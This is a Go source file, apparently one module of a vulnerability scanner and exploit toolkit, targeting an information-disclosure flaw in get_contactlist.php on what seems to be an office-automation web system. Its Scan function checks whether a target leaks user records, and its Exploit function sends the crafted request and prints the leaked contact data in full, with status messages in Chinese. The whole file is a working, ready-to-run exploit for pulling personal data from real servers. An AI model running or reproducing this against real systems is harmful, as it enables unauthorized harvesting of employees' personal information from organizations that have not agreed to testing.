package vulners

import (
	"strings"

	"github.com/fatih/color"
)

type Td01 struct {
}

func (c *Td01) Scan(targetUrl string) {
	vulnerable, err := Td01scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td01] 存在get_contactlist.php 敏感信息泄漏")
	} else {
		color.White("[Td01] 不存在get_contactlist.php 敏感信息泄漏")
	}
}

func (*Td01) Exploit(targetUrl string) {
	runResult, err := Td01runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td01scancore(targetUrl string) (bool, error) {
	url := "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "user_uid") {
		return true, nil
	} else {
		return false, nil
	}
}

func Td01runcore(targetUrl string) (string, error) {
	url := "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "user_uid") {
		return "[Td01] 存在get_contactlist.php 敏感信息泄漏\n" + resContent, nil
	} else {
		return "", nil
	}
}
